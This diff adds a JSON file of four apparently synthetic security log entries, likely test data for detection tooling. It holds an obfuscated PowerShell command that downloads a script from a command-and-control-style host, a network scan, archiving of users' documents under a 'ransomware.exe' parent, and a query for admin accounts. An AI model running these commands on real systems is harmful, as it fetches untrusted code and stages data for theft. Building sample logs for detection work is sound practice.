@@ -1,0 +1,54 @@
+[
+  {
+    "timestamp": "2023-10-27T14:32:15.123Z",
+    "hostname": "WS-DC-01",
+    "source_ip": "192.168.1.150",
+    "destination_ip": "203.0.113.45",
+    "process_name": "powershell.exe",
+    "command_line": "powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwBjAG4AYwAuAGMAbwBtAC8AZABvAHcAbgBsAG8AYQBkACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAEMAOgBcAFQAZQBtAHAAXABzAGMAcgBpAHAAdAAuAHAAcwAxACIA",
+    "parent_process": "explorer.exe",
+    "user": "CORP\\jdoe",
+    "log_source": "Windows Security Log",
+    "event_id": "4688",
+    "severity": "High"
+  },
+  {
+    "timestamp": "2023-10-27T15:45:22.456Z",
+    "hostname": "WEB-SRV-02",
+    "source_ip": "10.0.0.25",
+    "destination_ip": "8.8.8.8",
+    "process_name": "nmap.exe",
+    "command_line": "nmap -sS -O 192.168.1.0/24",
+    "parent_process": "cmd.exe",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "log_source": "EDR Alert",
+    "event_id": "EDR-2023-10-27-001",
+    "severity": "Medium"
+  },
+  {
+    "timestamp": "2023-10-27T16:12:08.789Z",
+    "hostname": "FILE-SRV-03",
+    "source_ip": "192.168.1.200",
+    "destination_ip": "185.220.101.42",
+    "process_name": "winrar.exe",
+    "command_line": "winrar.exe a -r -ep1 backup.rar C:\\Users\\*\\Documents\\*.docx C:\\Users\\*\\Desktop\\*.pdf",
+    "parent_process": "ransomware.exe",
+    "user": "CORP\\admin",
+    "log_source": "File System Monitor",
+    "event_id": "FSM-2023-10-27-002",
+    "severity": "Critical"
+  },
+  {
+    "timestamp": "2023-10-27T17:23:45.012Z",
+    "hostname": "DB-SRV-01",
+    "source_ip": "172.16.1.100",
+    "destination_ip": "172.16.1.10",
+    "process_name": "sqlcmd.exe",
+    "command_line": "sqlcmd -S localhost -E -Q \"SELECT * FROM users WHERE role='admin'\"",
+    "parent_process": "powershell.exe",
+    "user": "CORP\\dbadmin",
+    "log_source": "Database Audit Log",
+    "event_id": "DB-2023-10-27-003",
+    "severity": "Medium"
+  }
+]
